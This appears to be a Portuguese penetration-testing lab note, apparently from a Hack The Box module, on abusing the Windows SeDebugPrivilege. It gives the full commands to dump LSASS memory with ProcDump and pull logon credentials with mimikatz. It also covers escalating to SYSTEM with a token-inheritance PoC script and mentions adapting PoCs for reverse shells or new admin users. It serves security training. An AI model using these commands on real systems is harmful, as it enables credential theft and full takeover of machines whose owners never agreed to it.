```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled

```

Podemos usar o [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) do pacote [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para aproveitar esse privilégio e descarregar a memória do processo. Um bom candidato é o processo Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)), que armazena as credenciais do usuário após ele fazer login no sistema.

```
C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.

```

O carregamos no mimikatz

```
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
```


## Por RDP
<img width="836" height="323" alt="2" src="https://github.com/user-attachments/assets/209de0e3-ec10-4445-bca2-b3695de190f0" />


---


## Execução remota de código como SYSTEM

Também podemos aproveitar o `SeDebugPrivilege` para [RCE](https://decoder.cloud/2018/02/02/getting-system/). Usando essa técnica, podemos elevar nossos privilégios para SYSTEM iniciando um [processo filho](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) e usando os direitos elevados concedidos à nossa conta por meio do `SeDebugPrivilege` para alterar o comportamento normal do sistema para herdar o token de um [processo pai](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads)
 e nos fazer passar por ele. Se tivermos como alvo um processo pai em execução como SYSTEM 
(especificando o ID do processo (ou PID) do processo de destino ou do programa em execução),
 poderemos elevar nossos direitos rapidamente. Vamos ver isso em 
ação.
Primeiro, transfira este [script PoC](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) para o sistema alvo. Em seguida, basta carregar o script e executá-lo com a seguinte sintaxe `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,“”)`. Observe que devemos adicionar um terceiro argumento em branco `“”` no final para que o PoC funcione corretamente.

O script PoC 
recebeu uma atualização. Acesse o repositório GitHub e verifique seu 
uso. https://github.com/decoder-it/psgetsystem

Primeiro, abra um console PowerShell elevado (clique com o botão direito do mouse, execute como administrador e digite as credenciais do usuário `jordan`). Em seguida, digite `tasklist` para obter uma lista dos processos em execução e os PIDs correspondentes.
```
PS C:\> tasklist

Image Name                     PID Session Name        Session#    Mem Usage========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

Aqui, podemos direcionar o winlogon.exe em execução sob o PID 612, que sabemos que é executado como SYSTEM em hosts Windows.
<img width="855" height="444" alt="3" src="https://github.com/user-attachments/assets/d536a56b-42f2-4790-8a22-1e537f74dd9e" />

Também poderíamos usar o cmdlet [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2)
 para obter o PID de um processo conhecido que é executado como SYSTEM 
(como LSASS) e passar o PID diretamente para o script, reduzindo
 o número de etapas necessárias.
 <img width="855" height="476" alt="4" src="https://github.com/user-attachments/assets/9f224fed-fde6-4a28-bcbe-10b4008cf03f" />

---

Outras ferramentas, como [esta](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC), existem para abrir um shell do SISTEMA quando temos SeDebugPrivilege.
 Muitas vezes, não teremos acesso RDP a um host, então teremos que modificar 
nossos PoCs para retornar um shell reverso ao nosso host de ataque como SYSTEM 
ou outro comando, como adicionar um usuário administrador. Experimente esses
 PoCs e veja de que outras maneiras você pode obter acesso ao SYSTEM, especialmente 
se você não tiver uma sessão totalmente interativa, como quando você consegue
 injetar comandos ou tem uma conexão de shell da web ou shell reverso como 
o usuário com SeDebugPrivilege. Tenha esses exemplos em mente
 caso você se depare com uma situação em que o despejo do LSASS não 
resulte em credenciais úteis (embora possamos obter acesso ao SYSTEM apenas com 
o hash NTLM da máquina, mas isso está fora do escopo deste módulo)
 e um shell ou RCE como SYSTEM seria benéfico.









